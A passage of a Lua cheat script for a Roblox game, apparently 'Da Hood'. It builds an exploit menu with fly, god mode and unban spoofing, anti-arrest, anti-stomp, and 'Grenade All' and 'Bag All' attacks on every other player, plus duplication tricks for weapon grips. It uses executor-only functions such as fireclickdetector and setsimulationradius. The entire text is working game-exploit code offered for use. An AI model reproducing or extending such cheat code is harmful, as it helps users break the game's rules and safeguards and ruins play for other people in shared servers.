					local pos = Instance.new("BodyVelocity", seat)
					pos.Name = "Vel"
					gyro.maxTorque = Vector3.new(9e9, 9e9, 9e9)
					pos.MaxForce = Vector3.new(9e9, 9e9, 9e9)
				else 
					seat.Gyro.cframe = workspace.CurrentCamera.CoordinateFrame
					local vel = CFrame.new(0, 0, 0)
					if control.w then
						vel = vel * CFrame.new(0, 0, -speed)
					end
					if control.s then
						vel = vel * CFrame.new(0, 0, speed)
					end
					if control.a then
						vel = vel * CFrame.new(-speed, 0, 0)
					end
					if control.d then
						vel = vel * CFrame.new(speed, 0, 0)
					end
					seat.Vel.Velocity = (seat.CFrame*vel).p - seat.CFrame.p
				end
			end
			if control.e and speed<100 then
				speed = speed + 1
			end
			if control.q and speed > 0 then
				speed = speed - 1
			end
		end
	end);
	local Headless = PlayerChannel:Button('Headless', function()
		pcall(function()
			game.Players.LocalPlayer.Character.Head.Neck:Destroy()
			game.Players.LocalPlayer.Character.UpperTorso.NeckAttachment:Destroy()
			game.Players.LocalPlayer.Character.Humanoid.HealthDisplayDistance = math.huge
			game.Players.LocalPlayer.Character.Humanoid.NameDisplayDistance = math.huge
			game.Players.LocalPlayer.Character.Head.Size = Vector3.new(0, 0, 0)
			game.Players.LocalPlayer.Character.Head.Massless = true
			game.Players.LocalPlayer.Character.Head.CanCollide = false

			heazd = true

			while heazd == true do 
				pcall(function()  
					game.Players.LocalPlayer.Character.Head.NeckRigAttachment.CFrame = CFrame.new(0, 100000.4736328125, 0)
					game.Players.LocalPlayer.Character.UpperTorso.NeckRigAttachment.CFrame = CFrame.new(0, 100000.4736328125, 0)
					game.Players.LocalPlayer.Character.Head.CFrame = CFrame.new(0, 100000.4736328125, 0)
				end)
				wait()
			end
		end)
	end);
	local Fog = PlayerChannel:Button('Fog', function()
		game:GetService('Lighting').FogEnd = math.huge;
	end);
	local AntiFlash = PlayerChannel:Button('Anti Flashbang', function()
		while wait() do
			pcall(function()
				game:GetService('Players').LocalPlayer.PlayerGui:FindFirstChild("MainScreenGui"):FindFirstChild("whiteScreen"):Destroy();
			end);
		end;
	end);
	local AnimationPass = PlayerChannel:Button('Free Animation Gamepass', function()
		-- // Delete Clones
		for _, v in next, game:GetService("CoreGui"):GetChildren() do
			if (v.Name:match("FreeAnimationPack")) then
				v:Destroy();
			end;
		end;

		-- // Instances
		local FreeAnimationPack = Instance.new("ScreenGui")
		local AnimationPack = Instance.new("TextButton")
		local Animations = Instance.new("ScrollingFrame")
		local UIListLayout = Instance.new("UIListLayout")
		local Lean = Instance.new("TextButton")
		local Lay = Instance.new("TextButton")
		local Dance1 = Instance.new("TextButton")
		local Dance2 = Instance.new("TextButton")
		local Greet = Instance.new("TextButton")
		local ChestPump = Instance.new("TextButton")
		local Praying = Instance.new("TextButton")
		local Stop = Instance.new("TextButton")
		local UniversalAnimation = Instance.new("Animation");

		-- // Utility
		function stopTracks()
			for _, v in next, game:GetService("Players").LocalPlayer.Character:FindFirstChildOfClass("Humanoid"):GetPlayingAnimationTracks() do
				if (v.Animation.AnimationId:match("rbxassetid")) then
					v:Stop();
				end;
			end;
		end;

		function loadAnimation(id)
			if UniversalAnimation.AnimationId == id then
				stopTracks();
				UniversalAnimation.AnimationId = "1";
			else
				UniversalAnimation.AnimationId = id;
				local animationTrack = game:GetService("Players").LocalPlayer.Character:FindFirstChildOfClass("Humanoid"):LoadAnimation(UniversalAnimation);
				animationTrack:Play();
			end;
		end;

		-- // Properties
		FreeAnimationPack.Name = "FreeAnimationPack"
		FreeAnimationPack.Parent = game.CoreGui;
		FreeAnimationPack.ZIndexBehavior = Enum.ZIndexBehavior.Sibling

		AnimationPack.Name = "AnimationPack"
		AnimationPack.Parent = FreeAnimationPack
		AnimationPack.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
		AnimationPack.BorderSizePixel = 0
		AnimationPack.Position = UDim2.new(0, 0, 0.388007045, 0)
		AnimationPack.Size = UDim2.new(0, 100, 0, 20)
		AnimationPack.Font = Enum.Font.SourceSansBold
		AnimationPack.Text = "Animations"
		AnimationPack.TextColor3 = Color3.fromRGB(0, 0, 0)
		AnimationPack.TextSize = 18.000
		AnimationPack.MouseButton1Click:Connect(function()
			if (Animations.Visible == false) then
				Animations.Visible = true;
			end;
		end);

		Animations.Name = "Animations"
		Animations.Parent = AnimationPack
		Animations.Active = true
		Animations.BackgroundColor3 = Color3.fromRGB(102, 102, 102)
		Animations.Position = UDim2.new(-0.104712225, 0, -1.54173493, 0)
		Animations.Size = UDim2.new(0, 120, 0, 195)
		Animations.Visible = false
		Animations.CanvasPosition = Vector2.new(0, 60.0000305)
		Animations.CanvasSize = UDim2.new(0, 0, 1, 235)

		UIListLayout.Parent = Animations
		UIListLayout.SortOrder = Enum.SortOrder.LayoutOrder
		UIListLayout.Padding = UDim.new(0, 2)

		Lean.Name = "Lean"
		Lean.Parent = Animations
		Lean.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
		Lean.Size = UDim2.new(1, 0, 0, 30)
		Lean.Font = Enum.Font.SourceSansBold
		Lean.Text = "Lean"
		Lean.TextColor3 = Color3.fromRGB(0, 0, 0)
		Lean.TextSize = 14.000
		Lean.MouseButton1Click:Connect(function()
			stopTracks();
			loadAnimation("rbxassetid://3152375249");
		end);

		Lay.Name = "Lay"
		Lay.Parent = Animations
		Lay.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
		Lay.Size = UDim2.new(1, 0, 0, 30)
		Lay.Font = Enum.Font.SourceSansBold
		Lay.Text = "Lay"
		Lay.TextColor3 = Color3.fromRGB(0, 0, 0)
		Lay.TextSize = 14.000
		Lay.MouseButton1Click:Connect(function()
			stopTracks();
			loadAnimation("rbxassetid://3152378852");
		end);

		Dance1.Name = "Dance1"
		Dance1.Parent = Animations
		Dance1.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
		Dance1.Size = UDim2.new(1, 0, 0, 30)
		Dance1.Font = Enum.Font.SourceSansBold
		Dance1.Text = "Dance1"
		Dance1.TextColor3 = Color3.fromRGB(0, 0, 0)
		Dance1.TextSize = 14.000
		Dance1.MouseButton1Click:Connect(function()
			stopTracks();
			loadAnimation("rbxassetid://3189773368");
		end);

		Dance2.Name = "Dance2"
		Dance2.Parent = Animations
		Dance2.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
		Dance2.Size = UDim2.new(1, 0, 0, 30)
		Dance2.Font = Enum.Font.SourceSansBold
		Dance2.Text = "Dance2"
		Dance2.TextColor3 = Color3.fromRGB(0, 0, 0)
		Dance2.TextSize = 14.000
		Dance2.MouseButton1Click:Connect(function()
			stopTracks();
			loadAnimation("rbxassetid://3189776546");
		end);

		Greet.Name = "Greet"
		Greet.Parent = Animations
		Greet.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
		Greet.Size = UDim2.new(1, 0, 0, 30)
		Greet.Font = Enum.Font.SourceSansBold
		Greet.Text = "Greet"
		Greet.TextColor3 = Color3.fromRGB(0, 0, 0)
		Greet.TextSize = 14.000
		Greet.MouseButton1Click:Connect(function()
			stopTracks();
			loadAnimation("rbxassetid://3189777795");
		end);

		ChestPump.Name = "ChestPump"
		ChestPump.Parent = Animations
		ChestPump.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
		ChestPump.Size = UDim2.new(1, 0, 0, 30)
		ChestPump.Font = Enum.Font.SourceSansBold
		ChestPump.Text = "Chest Pump"
		ChestPump.TextColor3 = Color3.fromRGB(0, 0, 0)
		ChestPump.TextSize = 14.000
		ChestPump.MouseButton1Click:Connect(function()
			stopTracks();
			loadAnimation("rbxassetid://3189779152");
		end);

		Praying.Name = "Praying"
		Praying.Parent = Animations
		Praying.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
		Praying.Size = UDim2.new(1, 0, 0, 30)
		Praying.Font = Enum.Font.SourceSansBold
		Praying.Text = "Praying"
		Praying.TextColor3 = Color3.fromRGB(0, 0, 0)
		Praying.TextSize = 14.000
		Praying.MouseButton1Click:Connect(function()
			stopTracks();
			loadAnimation("rbxassetid://3487719500");
		end);

		Stop.Name = "Stop"
		Stop.Parent = Animations
		Stop.BackgroundColor3 = Color3.fromRGB(255, 112, 112)
		Stop.Size = UDim2.new(1, 0, 0, 30)
		Stop.Font = Enum.Font.SourceSansBold
		Stop.Text = "Stop Animation"
		Stop.TextColor3 = Color3.fromRGB(0, 0, 0)
		Stop.TextSize = 14.000
		Stop.MouseButton1Click:Connect(function()
			stopTracks();
		end);
		--scripts
		local plr = game.Players.LocalPlayer

		plr:GetMouse().KeyDown:Connect(function(K)
			if K == "p" then
				Animations.Visible = false
			end
		end)
	end);
	local SilentAnims = PlayerChannel:Button('Silent Animations', function()
		game:GetService('RunService').Heartbeat:Connect(function()
			for _, v in next, game:GetService('Players').LocalPlayer.Character:FindFirstChildOfClass('Humanoid'):GetPlayingAnimationTracks() do
				if (v.Animation.AnimationId:match('rbxassetid')) then
					v:Stop();
				end;
			end;
		end);
	end);
	local Unjail = PlayerChannel:Button('Unjail', function()
		if game:GetService("Players").LocalPlayer.DataFolder.Currency.Value >= 125 then
			game:GetService("Players").LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(-270.94, 20.327, -242.38)
			game:GetService("Players").LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(-270.94, 20.327, -242.38)
			wait()
			fireclickdetector(game:GetService("Workspace").Ignored.Shop["[Key] - $125"].ClickDetector)
			wait(.1)
			fireclickdetector(game:GetService("Workspace").Ignored.Shop["[Key] - $125"].ClickDetector)
			fireclickdetector(game:GetService("Workspace").Ignored.Shop["[Key] - $125"].ClickDetector)
			repeat
				wait()
			until game:GetService("Players").LocalPlayer.Backpack:FindFirstChild('[Key]')
			local Hum = game:GetService("Players").LocalPlayer.Character:FindFirstChildOfClass('Humanoid')
			if Hum.Health > 0 then
				key1 = game:GetService("Players").LocalPlayer.Backpack:FindFirstChild('[Key]')
				if key1 then
					Hum:EquipTool(key1)
					for i, v in pairs(game:GetService"Players".LocalPlayer.Character:GetChildren()) do
						if v:isA("Tool") then
							game:GetService("Players").LocalPlayer.Character.Humanoid:EquipTool(key1)
							game:GetService("Players").LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(-485.668, 23.631, -285.169)
							v:Activate()
						end
					end
				end
			end
		end
	end);
	local Unban = PlayerChannel:Button('Unban', function()
		local localPlayer = game:GetService('Players').LocalPlayer;
		local localCharacter = localPlayer.Character;
		localCharacter:FindFirstChildOfClass('Humanoid'):Destroy();
		local newCharacter = localPlayer.CharacterAdded:Wait();
		local spoofFolder = Instance.new('Folder');
		spoofFolder.Name = 'FULLY_LOADED_CHAR';
		spoofFolder.Parent = newCharacter;
		newCharacter:WaitForChild('BodyEffects').Dead:Destroy();
		local spoofValue = Instance.new('BoolValue', newCharacter.BodyEffects);
		spoofValue.Name = 'Dead';
	end);
	local GodMode = PlayerChannel:Button('God Mode', function()
		local localPlayer = game:GetService('Players').LocalPlayer;
		local localCharacter = localPlayer.Character;
		localCharacter:FindFirstChildOfClass('Humanoid'):Destroy();
		local newCharacter = localPlayer.CharacterAdded:Wait();
		local spoofFolder = Instance.new('Folder');
		spoofFolder.Name = 'FULLY_LOADED_CHAR';
		spoofFolder.Parent = newCharacter;
		newCharacter:WaitForChild('BodyEffects').Dead:Destroy();
		newCharacter:WaitForChild('BodyEffects').BreakingParts:Destroy();
		local spoofValue = Instance.new('BoolValue', newCharacter.BodyEffects);
		spoofValue.Name = 'Dead';
	end);
	local GodV2 = PlayerChannel:Button('Anti Ragdoll', function()
		local localPlayer = game:GetService('Players').LocalPlayer;
		local localCharacter = localPlayer.Character;
		localCharacter:FindFirstChildOfClass('Humanoid'):Destroy();
		local newCharacter = localPlayer.CharacterAdded:Wait();
		local spoofFolder = Instance.new('Folder');
		spoofFolder.Name = 'FULLY_LOADED_CHAR';
		spoofFolder.Parent = newCharacter;
		newCharacter:WaitForChild('BodyEffects').RagdollConstraints:Destroy();
		newCharacter:WaitForChild('BodyEffects').BreakingParts:Destroy();
		local spoofValue = Instance.new('BoolValue', newCharacter.BodyEffects);
		spoofValue.Name = 'RagdollConstraints';
	end);

	local AntiStomp = CombatChannel:Button('Anti Stomp', function()
		pcall(function() 
			local corepackages = game:GetService"CorePackages" 
			local localplayer = game:GetService"Players".LocalPlayer 
			local run = game:GetService"RunService" run:BindToRenderStep("rrrrrrrrrrr",2000,function() 
				pcall(function() 
					if localplayer.Character.BodyEffects["K.O"].Value or localplayer.Character.Humanoid.Health == 0 then 
						local plr = game:GetService("Players").LocalPlayer
						local char = plr.Character
						local oldPos = char.HumanoidRootPart.CFrame;
						char.HumanoidRootPart.CFrame = CFrame.new(0, 999, 0)
						char:FindFirstChildOfClass("Humanoid"):UnequipTools()
						char:FindFirstChildOfClass("Humanoid"):Destroy()
						local newChar = Instance.new("Model", workspace)
						plr.Character = newChar
						wait()
						plr.Character = char
						newChar:Destroy()
						game:service'Players'.LocalPlayer.Character:BreakJoints()
						wait(game:service'Players'.RespawnTime + 0.5)
						wait(0.30)
						game:GetService("Players").LocalPlayer.Character.HumanoidRootPart.CFrame = oldPos
						wait(0.5)
					end 
				end)
			end)
		end)
	end);
	local AntiArrest = CombatChannel:Button('Anti Arrest', function()
		while wait() do
			pcall(function()
				for i, v in pairs(game.Players:GetChildren()) do
					if v.Character:FindFirstChild("Cuff") and (workspace.Players[game.Players.LocalPlayer.Name].HumanoidRootPart.Position - workspace.Players[v.Name].HumanoidRootPart.Position).Magnitude < 5 then
						if v.Name ~= game.Players.LocalPlayer.Name then
							game.Players.LocalPlayer.Character:Destroy()
						end
					end
				end
			end)
		end
	end);
	local GrenadeAll = CombatChannel:Button('Grenade All', function()
		local plr = game.Players.LocalPlayer
		local lastpos = plr.Character.HumanoidRootPart.CFrame
		local playercount; local grenadecount; local pp = {}
		local cock = true
		for I in pairs(game.Players:GetPlayers()) do
			playercount = I
		end

		game:GetService('RunService').Stepped:connect(function()
			setsimulationradius(math.huge)
		end)

		spawn(function()
			while cock do wait()
				for i, v in pairs(game.Workspace.Ignored:GetChildren()) do
					if v.Name == "Handle" then
						for index in pairs(pp) do
							table.insert(pp, v)
						end
						v.Name = tostring(i)
					end
				end
			end
		end)

		repeat wait()
			plr.Character.HumanoidRootPart.CFrame = game.Workspace.Ignored.Shop["[Grenade] - $700"].Head.CFrame
			fireclickdetector(game.Workspace.Ignored.Shop["[Grenade] - $700"].ClickDetector)
			for ii, vv in pairs(plr.Backpack:GetChildren()) do
				grenadecount = ii
			end
		until grenadecount >= playercount
		plr.Character.HumanoidRootPart.CFrame = lastpos

		for i, v in pairs(game.Players.LocalPlayer.Backpack:GetChildren()) do
			spawn(function()
				if v.Name == "[Grenade]" then
					v.Parent = plr.Character; v:Activate(); wait(0.1); v:Deactivate(); wait(0.1); v:Activate()
				end
			end)
		end

		for i, v in pairs(game.Players:GetPlayers()) do
			if v ~= plr then
				local mover = Instance.new("BodyPosition", pp[1])
				mover.P = 1e5
				table.remove(pp, 1)
				spawn(function()
					while wait() do
						mover.Position = v.Character.HumanoidRootPart.Position
					end
				end)
			end
		end
		cock = false
	end);
	local BagAll = CombatChannel:Button('Bag All', function()
		while true do
			local cor = coroutine.wrap(function()
				if not game:GetService("Players").LocalPlayer.Character:FindFirstChild("[BrownBag]") then
					local cor = coroutine.wrap(function()
						game:GetService("Players").LocalPlayer.Character:MoveTo(Vector3.new(-314.580566, 51.1788902, -727.484558))
					end)
					cor()			
					wait(1)
					fireclickdetector(workspace.Ignored.Shop["[BrownBag] - $25"].ClickDetector, 4)
					wait(0.5)
					game:GetService("Players").LocalPlayer.Backpack["[BrownBag]"].Parent = game:GetService("Players").LocalPlayer.Character
					_G.bagall = false
				end
			end)
			cor()
			for i, v in pairs(game:GetService("Players"):GetPlayers()) do
				if v.Character:FindFirstChild("Christmas_Sock") == nil and v.Character:FindFirstChildOfClass("ForceField") == nil and v.Character ~= game:GetService("Players").LocalPlayer.Character then
					local chars = v.Character
					if game:GetService("Players").LocalPlayer.Character:FindFirstChild("[BrownBag]") then
						game:GetService("Players").LocalPlayer.Character["[BrownBag]"]:Activate()
					end
					game:GetService("Players").LocalPlayer.Character:MoveTo(v.Character.UpperTorso.Position)
				end
				wait(0.005)
			end
			wait()
		end
	end);
	local BatDupe = CombatChannel:Button('Bat Dupe', function()
		game.Players.LocalPlayer.Backpack["[Bat]"].GripPos = Vector3.new(0, -2, 0)
		game.Players.LocalPlayer.Backpack["[Bat]"].GripForward = Vector3.new(0, 0, 0)
		game.Players.LocalPlayer.Backpack["[Bat]"].GripRight = Vector3.new(0, 0, 0)
		game.Players.LocalPlayer.Backpack["[Bat]"].GripUp = Vector3.new(0, 100, 0)
		game.Players.LocalPlayer.Backpack["[Bat]"].Parent = game.Players.LocalPlayer.Character

		game.Players.LocalPlayer.Backpack["[Bat]"].GripPos = Vector3.new(0, -4, 0)
		game.Players.LocalPlayer.Backpack["[Bat]"].GripForward = Vector3.new(0, 0, 0)
		game.Players.LocalPlayer.Backpack["[Bat]"].GripRight = Vector3.new(0, 0, 0)
		game.Players.LocalPlayer.Backpack["[Bat]"].GripUp = Vector3.new(0, 100, 0)
		game.Players.LocalPlayer.Backpack["[Bat]"].Parent = game.Players.LocalPlayer.Character


		game.Players.LocalPlayer.Backpack["[Bat]"].GripPos = Vector3.new(0, -6, 0)
		game.Players.LocalPlayer.Backpack["[Bat]"].GripForward = Vector3.new(0, 0, 0)
		game.Players.LocalPlayer.Backpack["[Bat]"].GripRight = Vector3.new(0, 0, 0)
		game.Players.LocalPlayer.Backpack["[Bat]"].GripUp = Vector3.new(0, 100, 0)
		game.Players.LocalPlayer.Backpack["[Bat]"].Parent = game.Players.LocalPlayer.Character

		game.Players.LocalPlayer.Backpack["[Bat]"].GripPos = Vector3.new(0, -8, 0)
		game.Players.LocalPlayer.Backpack["[Bat]"].GripForward = Vector3.new(0, 0, 0)
		game.Players.LocalPlayer.Backpack["[Bat]"].GripRight = Vector3.new(0, 0, 0)
		game.Players.LocalPlayer.Backpack["[Bat]"].GripUp = Vector3.new(0, 100, 0)
		game.Players.LocalPlayer.Backpack["[Bat]"].Parent = game.Players.LocalPlayer.Character

		game.Players.LocalPlayer.Backpack["[Bat]"].GripPos = Vector3.new(0, -10, 0)
		game.Players.LocalPlayer.Backpack["[Bat]"].GripForward = Vector3.new(0, 0, 0)
		game.Players.LocalPlayer.Backpack["[Bat]"].GripRight = Vector3.new(0, 0, 0)
		game.Players.LocalPlayer.Backpack["[Bat]"].GripUp = Vector3.new(0, 100, 0)
		game.Players.LocalPlayer.Backpack["[Bat]"].Parent = game.Players.LocalPlayer.Character

		game.Players.LocalPlayer.Backpack["[Bat]"].GripPos = Vector3.new(0, -12, 0)
		game.Players.LocalPlayer.Backpack["[Bat]"].GripForward = Vector3.new(0, 0, 0)
		game.Players.LocalPlayer.Backpack["[Bat]"].GripRight = Vector3.new(0, 0, 0)
		game.Players.LocalPlayer.Backpack["[Bat]"].GripUp = Vector3.new(0, 100, 0)
		game.Players.LocalPlayer.Backpack["[Bat]"].Parent = game.Players.LocalPlayer.Character

		game.Players.LocalPlayer.Backpack["[Bat]"].GripPos = Vector3.new(0, -14, 0)
		game.Players.LocalPlayer.Backpack["[Bat]"].GripForward = Vector3.new(0, 0, 0)
		game.Players.LocalPlayer.Backpack["[Bat]"].GripRight = Vector3.new(0, 0, 0)
		game.Players.LocalPlayer.Backpack["[Bat]"].GripUp = Vector3.new(0, 100, 0)
		game.Players.LocalPlayer.Backpack["[Bat]"].Parent = game.Players.LocalPlayer.Character

		game.Players.LocalPlayer.Backpack["[Bat]"].GripPos = Vector3.new(0, -16, 0)
		game.Players.LocalPlayer.Backpack["[Bat]"].GripForward = Vector3.new(0, 0, 0)
		game.Players.LocalPlayer.Backpack["[Bat]"].GripRight = Vector3.new(0, 0, 0)
		game.Players.LocalPlayer.Backpack["[Bat]"].GripUp = Vector3.new(0, 100, 0)
		game.Players.LocalPlayer.Backpack["[Bat]"].Parent = game.Players.LocalPlayer.Character

		game.Players.LocalPlayer.Backpack["[Bat]"].GripPos = Vector3.new(0, -18, 0)
		game.Players.LocalPlayer.Backpack["[Bat]"].GripForward = Vector3.new(0, 0, 0)
		game.Players.LocalPlayer.Backpack["[Bat]"].GripRight = Vector3.new(0, 0, 0)
		game.Players.LocalPlayer.Backpack["[Bat]"].GripUp = Vector3.new(0, 100, 0)
		game.Players.LocalPlayer.Backpack["[Bat]"].Parent = game.Players.LocalPlayer.Character

		game.Players.LocalPlayer.Backpack["[Bat]"].GripPos = Vector3.new(0, -22, 0)
		game.Players.LocalPlayer.Backpack["[Bat]"].GripForward = Vector3.new(0, 0, 0)
		game.Players.LocalPlayer.Backpack["[Bat]"].GripRight = Vector3.new(0, 0, 0)
		game.Players.LocalPlayer.Backpack["[Bat]"].GripUp = Vector3.new(0, 100, 0)
		game.Players.LocalPlayer.Backpack["[Bat]"].Parent = game.Players.LocalPlayer.Character

		game.Players.LocalPlayer.Backpack["[Bat]"].GripPos = Vector3.new(0, -25, 0)
		game.Players.LocalPlayer.Backpack["[Bat]"].GripForward = Vector3.new(0, 0, 0)
		game.Players.LocalPlayer.Backpack["[Bat]"].GripRight = Vector3.new(0, 0, 0)
		game.Players.LocalPlayer.Backpack["[Bat]"].GripUp = Vector3.new(0, 100, 0)
		game.Players.LocalPlayer.Backpack["[Bat]"].Parent = game.Players.LocalPlayer.Character

		game.Players.LocalPlayer.Backpack["[Bat]"].GripPos = Vector3.new(0, -28, 0)
		game.Players.LocalPlayer.Backpack["[Bat]"].GripForward = Vector3.new(0, 0, 0)
		game.Players.LocalPlayer.Backpack["[Bat]"].GripRight = Vector3.new(0, 0, 0)
		game.Players.LocalPlayer.Backpack["[Bat]"].GripUp = Vector3.new(0, 100, 0)
		game.Players.LocalPlayer.Backpack["[Bat]"].Parent = game.Players.LocalPlayer.Character

		game.Players.LocalPlayer.Backpack["[Bat]"].GripPos = Vector3.new(0, -30, 0)
		game.Players.LocalPlayer.Backpack["[Bat]"].GripForward = Vector3.new(0, 0, 0)
		game.Players.LocalPlayer.Backpack["[Bat]"].GripRight = Vector3.new(0, 0, 0)
		game.Players.LocalPlayer.Backpack["[Bat]"].GripUp = Vector3.new(0, 100, 0)
		game.Players.LocalPlayer.Backpack["[Bat]"].Parent = game.Players.LocalPlayer.Character

		game.Players.LocalPlayer.Backpack["[Bat]"].GripPos = Vector3.new(0, -32, 0)
		game.Players.LocalPlayer.Backpack["[Bat]"].GripForward = Vector3.new(0, 0, 0)
		game.Players.LocalPlayer.Backpack["[Bat]"].GripRight = Vector3.new(0, 0, 0)
		game.Players.LocalPlayer.Backpack["[Bat]"].GripUp = Vector3.new(0, 100, 0)
		game.Players.LocalPlayer.Backpack["[Bat]"].Parent = game.Players.LocalPlayer.Character

		game.Players.LocalPlayer.Backpack["[Bat]"].GripPos = Vector3.new(0, -35, 0)
		game.Players.LocalPlayer.Backpack["[Bat]"].GripForward = Vector3.new(0, 0, 0)
		game.Players.LocalPlayer.Backpack["[Bat]"].GripRight = Vector3.new(0, 0, 0)
		game.Players.LocalPlayer.Backpack["[Bat]"].GripUp = Vector3.new(0, 100, 0)
		game.Players.LocalPlayer.Backpack["[Bat]"].Parent = game.Players.LocalPlayer.Character

		game.Players.LocalPlayer.Backpack["[Bat]"].GripPos = Vector3.new(0, -38, 0)
		game.Players.LocalPlayer.Backpack["[Bat]"].GripForward = Vector3.new(0, 0, 0)
		game.Players.LocalPlayer.Backpack["[Bat]"].GripRight = Vector3.new(0, 0, 0)
		game.Players.LocalPlayer.Backpack["[Bat]"].GripUp = Vector3.new(0, 100, 0)
		game.Players.LocalPlayer.Backpack["[Bat]"].Parent = game.Players.LocalPlayer.Character

		game.Players.LocalPlayer.Backpack["[Bat]"].GripPos = Vector3.new(0, -42, 0)
		game.Players.LocalPlayer.Backpack["[Bat]"].GripForward = Vector3.new(0, 0, 0)
		game.Players.LocalPlayer.Backpack["[Bat]"].GripRight = Vector3.new(0, 0, 0)
		game.Players.LocalPlayer.Backpack["[Bat]"].GripUp = Vector3.new(0, 100, 0)
		game.Players.LocalPlayer.Backpack["[Bat]"].Parent = game.Players.LocalPlayer.Character

		game.Players.LocalPlayer.Backpack["[Bat]"].GripPos = Vector3.new(0, -45, 0)
		game.Players.LocalPlayer.Backpack["[Bat]"].GripForward = Vector3.new(0, 0, 0)
		game.Players.LocalPlayer.Backpack["[Bat]"].GripRight = Vector3.new(0, 0, 0)
		game.Players.LocalPlayer.Backpack["[Bat]"].GripUp = Vector3.new(0, 100, 0)
		game.Players.LocalPlayer.Backpack["[Bat]"].Parent = game.Players.LocalPlayer.Character
	end);
	local Katana = CombatChannel:Button('Katana', function()
		game.Players.LocalPlayer.Backpack["[Knife]"].GripPos = Vector3.new(1, 0, 0.1)
		game.Players.LocalPlayer.Backpack["[Knife]"].GripForward = Vector3.new(0, 0, 0)
		game.Players.LocalPlayer.Backpack["[Knife]"].GripRight = Vector3.new(0, 0, 0)
		game.Players.LocalPlayer.Backpack["[Knife]"].GripUp = Vector3.new(-1, 0, 0)
		game.Players.LocalPlayer.Backpack["[Knife]"].Parent = game.Players.LocalPlayer.Character

		game.Players.LocalPlayer.Backpack["[Knife]"].GripPos = Vector3.new(2, 0, 0.1)
		game.Players.LocalPlayer.Backpack["[Knife]"].GripForward = Vector3.new(0, 0, 0)
		game.Players.LocalPlayer.Backpack["[Knife]"].GripRight = Vector3.new(0, 0, 0)
		game.Players.LocalPlayer.Backpack["[Knife]"].GripUp = Vector3.new(-1, 0, 0)
		game.Players.LocalPlayer.Backpack["[Knife]"].Parent = game.Players.LocalPlayer.Character 

		game.Players.LocalPlayer.Backpack["[Knife]"].GripPos = Vector3.new(3, 0, 0.1)
		game.Players.LocalPlayer.Backpack["[Knife]"].GripForward = Vector3.new(0, 0, 0)
		game.Players.LocalPlayer.Backpack["[Knife]"].GripRight = Vector3.new(0, 0, 0)
		game.Players.LocalPlayer.Backpack["[Knife]"].GripUp = Vector3.new(-1, 0, 0)
		game.Players.LocalPlayer.Backpack["[Knife]"].Parent = game.Players.LocalPlayer.Character 

		game.Players.LocalPlayer.Backpack["[Knife]"].GripPos = Vector3.new(4, 0, 0.1)
		game.Players.LocalPlayer.Backpack["[Knife]"].GripForward = Vector3.new(0, 0, 0)
		game.Players.LocalPlayer.Backpack["[Knife]"].GripRight = Vector3.new(0, 0, 0)
		game.Players.LocalPlayer.Backpack["[Knife]"].GripUp = Vector3.new(-1, 0, 0)
		game.Players.LocalPlayer.Backpack["[Knife]"].Parent = game.Players.LocalPlayer.Character 
	end);
	local NinjaStar = CombatChannel:Button('Ninja Star', function()
		local cor = coroutine.wrap(function()
			game.Players.LocalPlayer.Character:MoveTo(Vector3.new(-278.063446, 21.75, -235.871841))
		end)
		cor()			
		wait(1)
		fireclickdetector(workspace.Ignored.Shop["[Knife] - $150"].ClickDetector, 4)
		wait(1)
		game.Players.LocalPlayer.Backpack["[Knife]"].GripPos     = Vector3.new(0, 0, 0 )
		game.Players.LocalPlayer.Backpack["[Knife]"].GripForward     = Vector3.new(0, 0, 0)
		game.Players.LocalPlayer.Backpack["[Knife]"].GripRight     = Vector3.new(0, 0, 0)
		game.Players.LocalPlayer.Backpack["[Knife]"].GripUp     = Vector3.new(0, 0, 0)
		wait(0.20)
		game.Players.LocalPlayer.Backpack["[Knife]"].Parent = game.Players.LocalPlayer.Character
		wait(0.3)
		fireclickdetector(workspace.Ignored.Shop["[Knife] - $150"].ClickDetector, 4)
		wait(1)
		game.Players.LocalPlayer.Backpack["[Knife]"].GripPos     = Vector3.new(0, 0, 0)
		game.Players.LocalPlayer.Backpack["[Knife]"].GripForward     = Vector3.new(5, 5, 5)
		game.Players.LocalPlayer.Backpack["[Knife]"].GripRight     = Vector3.new(0, 0, 0)
		game.Players.LocalPlayer.Backpack["[Knife]"].GripUp     = Vector3.new(0, 5, 0)
		wait(0.20)
		if game.Players.LocalPlayer.Backpack:FindFirstChild("[Knife]") then
			game.Players.LocalPlayer.Backpack:FindFirstChild("[Knife]").Parent = game.Players.LocalPlayer.Character
		end 
	end);
	local HolyCross = CombatChannel:Button('Holy Cross', function()
		pcall(function()
			for i,v in pairs(game.Players.LocalPlayer.Backpack:GetChildren()) do
				if v.Name == '[SledgeHammer]' then
					v.Parent = game.Players.LocalPlayer.Character
				end
			end
		end)
		wait(.9)
		local targetpos = CFrame.new(-899.925659, 21.75, -297.100342)
		local plr = game.Players.LocalPlayer
		local pos = plr.Character.HumanoidRootPart.Position
		if not game.Players.LocalPlayer.Character:FindFirstChild("[SledgeHammer]") then
			plr.Character.HumanoidRootPart.CFrame = targetpos
			local cd = game:GetService("Workspace").Ignored.Shop["[SledgeHammer] - $350"]:FindFirstChild("ClickDetector")
			wait(.9)
			fireclickdetector(cd)
			wait(.4)
			game.Players.LocalPlayer.Backpack:FindFirstChild("[SledgeHammer]").Parent = plr.Character
			wait(.9)
			fireclickdetector(cd)
			wait(.4)
			game.Players.LocalPlayer.Backpack:FindFirstChild("[SledgeHammer]").Parent = plr.Character
			for i,v in pairs(plr.Character:GetChildren()) do
				if v.Name == '[SledgeHammer]' then
					v:GetChildren()[3]:Destroy()
				end
			end
			local sd = plr.Character:FindFirstChild("[SledgeHammer]")
			sd.Grip = CFrame.new(-2.4000001, -0.699999988, 0, 0, 1, -0, -1, 0, -0, 0, 0, 1)
			sd.GripForward = Vector3.new(0, 0, -1)
			sd.GripPos = Vector3.new(-2.4, -0.7, 0)
			sd.GripUp = Vector3.new(1, 0, 0)
			plr.Character.HumanoidRootPart.CFrame = CFrame.new(pos)
		end
		local sd = plr.Character:FindFirstChild("[SledgeHammer]")
